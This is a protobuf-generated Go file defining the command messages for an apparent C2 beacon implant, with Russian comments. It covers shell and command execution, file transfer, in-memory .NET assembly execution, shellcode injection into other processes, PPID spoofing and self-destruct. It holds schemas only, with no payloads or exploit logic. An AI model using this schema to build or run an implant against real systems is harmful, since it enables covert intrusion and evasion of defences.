// Code generated by protoc-gen-go. DO NOT EDIT.
// versions:
// 	protoc-gen-go v1.36.0
// 	protoc        v5.29.1
// source: common/v1/common.proto

package commonv1

import (
	protoreflect "google.golang.org/protobuf/reflect/protoreflect"
	protoimpl "google.golang.org/protobuf/runtime/protoimpl"
	reflect "reflect"
	sync "sync"
)

const (
	// Verify that this generated code is sufficiently up-to-date.
	_ = protoimpl.EnforceVersion(20 - protoimpl.MinVersion)
	// Verify that runtime/protoimpl is sufficiently up-to-date.
	_ = protoimpl.EnforceVersion(protoimpl.MaxVersion - 20)
)

// CapSleep изменение sleep/jitter у бикона
type CapSleep struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	Sleep         uint32                 `protobuf:"varint,1,opt,name=sleep,proto3" json:"sleep,omitempty"`
	Jitter        uint32                 `protobuf:"varint,2,opt,name=jitter,proto3" json:"jitter,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *CapSleep) Reset() {
	*x = CapSleep{}
	mi := &file_common_v1_common_proto_msgTypes[0]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *CapSleep) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*CapSleep) ProtoMessage() {}

func (x *CapSleep) ProtoReflect() protoreflect.Message {
	mi := &file_common_v1_common_proto_msgTypes[0]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use CapSleep.ProtoReflect.Descriptor instead.
func (*CapSleep) Descriptor() ([]byte, []int) {
	return file_common_v1_common_proto_rawDescGZIP(), []int{0}
}

func (x *CapSleep) GetSleep() uint32 {
	if x != nil {
		return x.Sleep
	}
	return 0
}

func (x *CapSleep) GetJitter() uint32 {
	if x != nil {
		return x.Jitter
	}
	return 0
}

// CapLs получение листинга директории/файла по пути
type CapLs struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	Path          string                 `protobuf:"bytes,1,opt,name=path,proto3" json:"path,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *CapLs) Reset() {
	*x = CapLs{}
	mi := &file_common_v1_common_proto_msgTypes[1]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *CapLs) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*CapLs) ProtoMessage() {}

func (x *CapLs) ProtoReflect() protoreflect.Message {
	mi := &file_common_v1_common_proto_msgTypes[1]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use CapLs.ProtoReflect.Descriptor instead.
func (*CapLs) Descriptor() ([]byte, []int) {
	return file_common_v1_common_proto_rawDescGZIP(), []int{1}
}

func (x *CapLs) GetPath() string {
	if x != nil {
		return x.Path
	}
	return ""
}

// CapPwd получение текущего рабочего пути процесса
type CapPwd struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *CapPwd) Reset() {
	*x = CapPwd{}
	mi := &file_common_v1_common_proto_msgTypes[2]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *CapPwd) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*CapPwd) ProtoMessage() {}

func (x *CapPwd) ProtoReflect() protoreflect.Message {
	mi := &file_common_v1_common_proto_msgTypes[2]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use CapPwd.ProtoReflect.Descriptor instead.
func (*CapPwd) Descriptor() ([]byte, []int) {
	return file_common_v1_common_proto_rawDescGZIP(), []int{2}
}

// CapCd изменение текущего рабочего пути процесса
type CapCd struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	Path          string                 `protobuf:"bytes,1,opt,name=path,proto3" json:"path,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *CapCd) Reset() {
	*x = CapCd{}
	mi := &file_common_v1_common_proto_msgTypes[3]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *CapCd) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*CapCd) ProtoMessage() {}

func (x *CapCd) ProtoReflect() protoreflect.Message {
	mi := &file_common_v1_common_proto_msgTypes[3]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use CapCd.ProtoReflect.Descriptor instead.
func (*CapCd) Descriptor() ([]byte, []int) {
	return file_common_v1_common_proto_rawDescGZIP(), []int{3}
}

func (x *CapCd) GetPath() string {
	if x != nil {
		return x.Path
	}
	return ""
}

// CapWhoami получение информации о пользователе, под которым запущен бикон
type CapWhoami struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *CapWhoami) Reset() {
	*x = CapWhoami{}
	mi := &file_common_v1_common_proto_msgTypes[4]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *CapWhoami) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*CapWhoami) ProtoMessage() {}

func (x *CapWhoami) ProtoReflect() protoreflect.Message {
	mi := &file_common_v1_common_proto_msgTypes[4]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use CapWhoami.ProtoReflect.Descriptor instead.
func (*CapWhoami) Descriptor() ([]byte, []int) {
	return file_common_v1_common_proto_rawDescGZIP(), []int{4}
}

// CapPs получение списка активных процессов на таргете
type CapPs struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *CapPs) Reset() {
	*x = CapPs{}
	mi := &file_common_v1_common_proto_msgTypes[5]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *CapPs) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*CapPs) ProtoMessage() {}

func (x *CapPs) ProtoReflect() protoreflect.Message {
	mi := &file_common_v1_common_proto_msgTypes[5]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use CapPs.ProtoReflect.Descriptor instead.
func (*CapPs) Descriptor() ([]byte, []int) {
	return file_common_v1_common_proto_rawDescGZIP(), []int{5}
}

// CapCat печать файла по пути в консоль
type CapCat struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	Path          string                 `protobuf:"bytes,1,opt,name=path,proto3" json:"path,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *CapCat) Reset() {
	*x = CapCat{}
	mi := &file_common_v1_common_proto_msgTypes[6]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *CapCat) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*CapCat) ProtoMessage() {}

func (x *CapCat) ProtoReflect() protoreflect.Message {
	mi := &file_common_v1_common_proto_msgTypes[6]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use CapCat.ProtoReflect.Descriptor instead.
func (*CapCat) Descriptor() ([]byte, []int) {
	return file_common_v1_common_proto_rawDescGZIP(), []int{6}
}

func (x *CapCat) GetPath() string {
	if x != nil {
		return x.Path
	}
	return ""
}

// CapExec выполнение команды с аргументами
type CapExec struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	Cmd           string                 `protobuf:"bytes,1,opt,name=cmd,proto3" json:"cmd,omitempty"`
	Args          string                 `protobuf:"bytes,2,opt,name=args,proto3" json:"args,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *CapExec) Reset() {
	*x = CapExec{}
	mi := &file_common_v1_common_proto_msgTypes[7]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *CapExec) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*CapExec) ProtoMessage() {}

func (x *CapExec) ProtoReflect() protoreflect.Message {
	mi := &file_common_v1_common_proto_msgTypes[7]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use CapExec.ProtoReflect.Descriptor instead.
func (*CapExec) Descriptor() ([]byte, []int) {
	return file_common_v1_common_proto_rawDescGZIP(), []int{7}
}

func (x *CapExec) GetCmd() string {
	if x != nil {
		return x.Cmd
	}
	return ""
}

func (x *CapExec) GetArgs() string {
	if x != nil {
		return x.Args
	}
	return ""
}

// CapCp копирование файла/директории
type CapCp struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	Src           string                 `protobuf:"bytes,1,opt,name=src,proto3" json:"src,omitempty"`
	Dst           string                 `protobuf:"bytes,2,opt,name=dst,proto3" json:"dst,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *CapCp) Reset() {
	*x = CapCp{}
	mi := &file_common_v1_common_proto_msgTypes[8]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *CapCp) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*CapCp) ProtoMessage() {}

func (x *CapCp) ProtoReflect() protoreflect.Message {
	mi := &file_common_v1_common_proto_msgTypes[8]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use CapCp.ProtoReflect.Descriptor instead.
func (*CapCp) Descriptor() ([]byte, []int) {
	return file_common_v1_common_proto_rawDescGZIP(), []int{8}
}

func (x *CapCp) GetSrc() string {
	if x != nil {
		return x.Src
	}
	return ""
}

func (x *CapCp) GetDst() string {
	if x != nil {
		return x.Dst
	}
	return ""
}

// CapJobs получение активных долгоиграющих задач внутри бикона
type CapJobs struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *CapJobs) Reset() {
	*x = CapJobs{}
	mi := &file_common_v1_common_proto_msgTypes[9]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *CapJobs) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*CapJobs) ProtoMessage() {}

func (x *CapJobs) ProtoReflect() protoreflect.Message {
	mi := &file_common_v1_common_proto_msgTypes[9]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use CapJobs.ProtoReflect.Descriptor instead.
func (*CapJobs) Descriptor() ([]byte, []int) {
	return file_common_v1_common_proto_rawDescGZIP(), []int{9}
}

// CapJobkill остановка долгоиграющей задачи бикона по его id
type CapJobkill struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	Id            int64                  `protobuf:"varint,1,opt,name=id,proto3" json:"id,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *CapJobkill) Reset() {
	*x = CapJobkill{}
	mi := &file_common_v1_common_proto_msgTypes[10]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *CapJobkill) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*CapJobkill) ProtoMessage() {}

func (x *CapJobkill) ProtoReflect() protoreflect.Message {
	mi := &file_common_v1_common_proto_msgTypes[10]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use CapJobkill.ProtoReflect.Descriptor instead.
func (*CapJobkill) Descriptor() ([]byte, []int) {
	return file_common_v1_common_proto_rawDescGZIP(), []int{10}
}

func (x *CapJobkill) GetId() int64 {
	if x != nil {
		return x.Id
	}
	return 0
}

// CapKill остановка процесса по его PID
type CapKill struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	Pid           uint64                 `protobuf:"varint,1,opt,name=pid,proto3" json:"pid,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *CapKill) Reset() {
	*x = CapKill{}
	mi := &file_common_v1_common_proto_msgTypes[11]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *CapKill) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*CapKill) ProtoMessage() {}

func (x *CapKill) ProtoReflect() protoreflect.Message {
	mi := &file_common_v1_common_proto_msgTypes[11]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use CapKill.ProtoReflect.Descriptor instead.
func (*CapKill) Descriptor() ([]byte, []int) {
	return file_common_v1_common_proto_rawDescGZIP(), []int{11}
}

func (x *CapKill) GetPid() uint64 {
	if x != nil {
		return x.Pid
	}
	return 0
}

// CapMv перемещение файла
type CapMv struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	Src           string                 `protobuf:"bytes,1,opt,name=src,proto3" json:"src,omitempty"`
	Dst           string                 `protobuf:"bytes,2,opt,name=dst,proto3" json:"dst,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *CapMv) Reset() {
	*x = CapMv{}
	mi := &file_common_v1_common_proto_msgTypes[12]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *CapMv) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*CapMv) ProtoMessage() {}

func (x *CapMv) ProtoReflect() protoreflect.Message {
	mi := &file_common_v1_common_proto_msgTypes[12]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use CapMv.ProtoReflect.Descriptor instead.
func (*CapMv) Descriptor() ([]byte, []int) {
	return file_common_v1_common_proto_rawDescGZIP(), []int{12}
}

func (x *CapMv) GetSrc() string {
	if x != nil {
		return x.Src
	}
	return ""
}

func (x *CapMv) GetDst() string {
	if x != nil {
		return x.Dst
	}
	return ""
}

// CapMkdir создание директори по пути
type CapMkdir struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	Path          string                 `protobuf:"bytes,1,opt,name=path,proto3" json:"path,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *CapMkdir) Reset() {
	*x = CapMkdir{}
	mi := &file_common_v1_common_proto_msgTypes[13]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *CapMkdir) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*CapMkdir) ProtoMessage() {}

func (x *CapMkdir) ProtoReflect() protoreflect.Message {
	mi := &file_common_v1_common_proto_msgTypes[13]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use CapMkdir.ProtoReflect.Descriptor instead.
func (*CapMkdir) Descriptor() ([]byte, []int) {
	return file_common_v1_common_proto_rawDescGZIP(), []int{13}
}

func (x *CapMkdir) GetPath() string {
	if x != nil {
		return x.Path
	}
	return ""
}

// CapRm удаление директории/файла по пути
type CapRm struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	Path          string                 `protobuf:"bytes,1,opt,name=path,proto3" json:"path,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *CapRm) Reset() {
	*x = CapRm{}
	mi := &file_common_v1_common_proto_msgTypes[14]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *CapRm) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*CapRm) ProtoMessage() {}

func (x *CapRm) ProtoReflect() protoreflect.Message {
	mi := &file_common_v1_common_proto_msgTypes[14]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use CapRm.ProtoReflect.Descriptor instead.
func (*CapRm) Descriptor() ([]byte, []int) {
	return file_common_v1_common_proto_rawDescGZIP(), []int{14}
}

func (x *CapRm) GetPath() string {
	if x != nil {
		return x.Path
	}
	return ""
}

// CapExecAssembly выполнение .net программы с аргументами в памяти процесса бикона
type CapExecAssembly struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	Args          string                 `protobuf:"bytes,1,opt,name=args,proto3" json:"args,omitempty"`
	Blob          []byte                 `protobuf:"bytes,2,opt,name=blob,proto3" json:"blob,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *CapExecAssembly) Reset() {
	*x = CapExecAssembly{}
	mi := &file_common_v1_common_proto_msgTypes[15]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *CapExecAssembly) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*CapExecAssembly) ProtoMessage() {}

func (x *CapExecAssembly) ProtoReflect() protoreflect.Message {
	mi := &file_common_v1_common_proto_msgTypes[15]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use CapExecAssembly.ProtoReflect.Descriptor instead.
func (*CapExecAssembly) Descriptor() ([]byte, []int) {
	return file_common_v1_common_proto_rawDescGZIP(), []int{15}
}

func (x *CapExecAssembly) GetArgs() string {
	if x != nil {
		return x.Args
	}
	return ""
}

func (x *CapExecAssembly) GetBlob() []byte {
	if x != nil {
		return x.Blob
	}
	return nil
}

// CapShellcodeInjection инжект шелкода в процесс
type CapShellcodeInjection struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	Pid           int64                  `protobuf:"varint,1,opt,name=pid,proto3" json:"pid,omitempty"`
	Blob          []byte                 `protobuf:"bytes,2,opt,name=blob,proto3" json:"blob,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *CapShellcodeInjection) Reset() {
	*x = CapShellcodeInjection{}
	mi := &file_common_v1_common_proto_msgTypes[16]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *CapShellcodeInjection) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*CapShellcodeInjection) ProtoMessage() {}

func (x *CapShellcodeInjection) ProtoReflect() protoreflect.Message {
	mi := &file_common_v1_common_proto_msgTypes[16]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use CapShellcodeInjection.ProtoReflect.Descriptor instead.
func (*CapShellcodeInjection) Descriptor() ([]byte, []int) {
	return file_common_v1_common_proto_rawDescGZIP(), []int{16}
}

func (x *CapShellcodeInjection) GetPid() int64 {
	if x != nil {
		return x.Pid
	}
	return 0
}

func (x *CapShellcodeInjection) GetBlob() []byte {
	if x != nil {
		return x.Blob
	}
	return nil
}

// CapDownload скачивание файла по его пути
type CapDownload struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	Path          string                 `protobuf:"bytes,1,opt,name=path,proto3" json:"path,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *CapDownload) Reset() {
	*x = CapDownload{}
	mi := &file_common_v1_common_proto_msgTypes[17]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *CapDownload) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*CapDownload) ProtoMessage() {}

func (x *CapDownload) ProtoReflect() protoreflect.Message {
	mi := &file_common_v1_common_proto_msgTypes[17]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use CapDownload.ProtoReflect.Descriptor instead.
func (*CapDownload) Descriptor() ([]byte, []int) {
	return file_common_v1_common_proto_rawDescGZIP(), []int{17}
}

func (x *CapDownload) GetPath() string {
	if x != nil {
		return x.Path
	}
	return ""
}

// CapUpload загрузка данных по пути
type CapUpload struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	Path          string                 `protobuf:"bytes,1,opt,name=path,proto3" json:"path,omitempty"`
	Blob          []byte                 `protobuf:"bytes,2,opt,name=blob,proto3" json:"blob,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *CapUpload) Reset() {
	*x = CapUpload{}
	mi := &file_common_v1_common_proto_msgTypes[18]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *CapUpload) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*CapUpload) ProtoMessage() {}

func (x *CapUpload) ProtoReflect() protoreflect.Message {
	mi := &file_common_v1_common_proto_msgTypes[18]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use CapUpload.ProtoReflect.Descriptor instead.
func (*CapUpload) Descriptor() ([]byte, []int) {
	return file_common_v1_common_proto_rawDescGZIP(), []int{18}
}

func (x *CapUpload) GetPath() string {
	if x != nil {
		return x.Path
	}
	return ""
}

func (x *CapUpload) GetBlob() []byte {
	if x != nil {
		return x.Blob
	}
	return nil
}

// CapPause одноразовый sleep
type CapPause struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	Pause         uint32                 `protobuf:"varint,1,opt,name=pause,proto3" json:"pause,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *CapPause) Reset() {
	*x = CapPause{}
	mi := &file_common_v1_common_proto_msgTypes[19]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *CapPause) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*CapPause) ProtoMessage() {}

func (x *CapPause) ProtoReflect() protoreflect.Message {
	mi := &file_common_v1_common_proto_msgTypes[19]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use CapPause.ProtoReflect.Descriptor instead.
func (*CapPause) Descriptor() ([]byte, []int) {
	return file_common_v1_common_proto_rawDescGZIP(), []int{19}
}

func (x *CapPause) GetPause() uint32 {
	if x != nil {
		return x.Pause
	}
	return 0
}

// CapDestruct самоуничтожение бикона
type CapDestruct struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *CapDestruct) Reset() {
	*x = CapDestruct{}
	mi := &file_common_v1_common_proto_msgTypes[20]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *CapDestruct) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*CapDestruct) ProtoMessage() {}

func (x *CapDestruct) ProtoReflect() protoreflect.Message {
	mi := &file_common_v1_common_proto_msgTypes[20]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use CapDestruct.ProtoReflect.Descriptor instead.
func (*CapDestruct) Descriptor() ([]byte, []int) {
	return file_common_v1_common_proto_rawDescGZIP(), []int{20}
}

// CapExecDetach выполнение команды с аргументам с деатачем от основного процесса бикона
type CapExecDetach struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	Cmd           string                 `protobuf:"bytes,1,opt,name=cmd,proto3" json:"cmd,omitempty"`
	Args          string                 `protobuf:"bytes,2,opt,name=args,proto3" json:"args,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *CapExecDetach) Reset() {
	*x = CapExecDetach{}
	mi := &file_common_v1_common_proto_msgTypes[21]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *CapExecDetach) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*CapExecDetach) ProtoMessage() {}

func (x *CapExecDetach) ProtoReflect() protoreflect.Message {
	mi := &file_common_v1_common_proto_msgTypes[21]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use CapExecDetach.ProtoReflect.Descriptor instead.
func (*CapExecDetach) Descriptor() ([]byte, []int) {
	return file_common_v1_common_proto_rawDescGZIP(), []int{21}
}

func (x *CapExecDetach) GetCmd() string {
	if x != nil {
		return x.Cmd
	}
	return ""
}

func (x *CapExecDetach) GetArgs() string {
	if x != nil {
		return x.Args
	}
	return ""
}

// CapShell выполнение shell команды
type CapShell struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	Cmd           string                 `protobuf:"bytes,1,opt,name=cmd,proto3" json:"cmd,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *CapShell) Reset() {
	*x = CapShell{}
	mi := &file_common_v1_common_proto_msgTypes[22]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *CapShell) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*CapShell) ProtoMessage() {}

func (x *CapShell) ProtoReflect() protoreflect.Message {
	mi := &file_common_v1_common_proto_msgTypes[22]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use CapShell.ProtoReflect.Descriptor instead.
func (*CapShell) Descriptor() ([]byte, []int) {
	return file_common_v1_common_proto_rawDescGZIP(), []int{22}
}

func (x *CapShell) GetCmd() string {
	if x != nil {
		return x.Cmd
	}
	return ""
}

// CapPpid спуфинг PPID своего процесса
type CapPpid struct {
	state         protoimpl.MessageState `protogen:"open.v1"`
	Ppid          int64                  `protobuf:"varint,1,opt,name=ppid,proto3" json:"ppid,omitempty"`
	unknownFields protoimpl.UnknownFields
	sizeCache     protoimpl.SizeCache
}

func (x *CapPpid) Reset() {
	*x = CapPpid{}
	mi := &file_common_v1_common_proto_msgTypes[23]
	ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
	ms.StoreMessageInfo(mi)
}

func (x *CapPpid) String() string {
	return protoimpl.X.MessageStringOf(x)
}

func (*CapPpid) ProtoMessage() {}

func (x *CapPpid) ProtoReflect() protoreflect.Message {
	mi := &file_common_v1_common_proto_msgTypes[23]
	if x != nil {
		ms := protoimpl.X.MessageStateOf(protoimpl.Pointer(x))
		if ms.LoadMessageInfo() == nil {
			ms.StoreMessageInfo(mi)
		}
		return ms
	}
	return mi.MessageOf(x)
}

// Deprecated: Use CapPpid.ProtoReflect.Descriptor instead.
